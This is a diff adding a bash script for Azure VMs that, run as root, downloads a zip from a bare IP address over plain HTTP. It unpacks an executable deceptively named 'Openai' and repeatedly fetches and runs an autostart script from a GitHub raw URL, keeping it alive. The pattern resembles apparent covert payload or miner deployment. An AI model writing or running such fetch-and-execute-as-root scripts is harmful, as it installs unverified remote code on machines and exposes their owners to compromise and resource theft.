@@ -1,0 +1,37 @@
+#!/bin/bash
+
+set -x #echo on
+if [ -f /home/azureuser/Openai ]; then
+    if pgrep -x "Openai" > /dev/null
+then
+    echo "scrip dang chay roi , ke cmn di "
+    
+else
+
+echo "script da install , chay thoi "
+cd /home/azureuser/
+sleep 10
+sudo chmod +x Openai
+rm autostart.sh
+sudo wget https://raw.githubusercontent.com/haidanglx/script/master/autostart.sh
+sudo chmod +x autostart.sh
+sudo -E env "HOSTNAME=$HOSTNAME" ./autostart.sh
+
+fi
+exit
+fi
+
+
+
+cd /home/azureuser/
+
+sudo wget http://20.212.206.110:8000/don.zip
+
+sudo apt install unzip
+sudo unzip -o don.zip
+sudo chmod +x Openai
+
+sudo wget https://raw.githubusercontent.com/haidanglx/script/master/autostart.sh
+sh autostart.sh
+
+exit 0
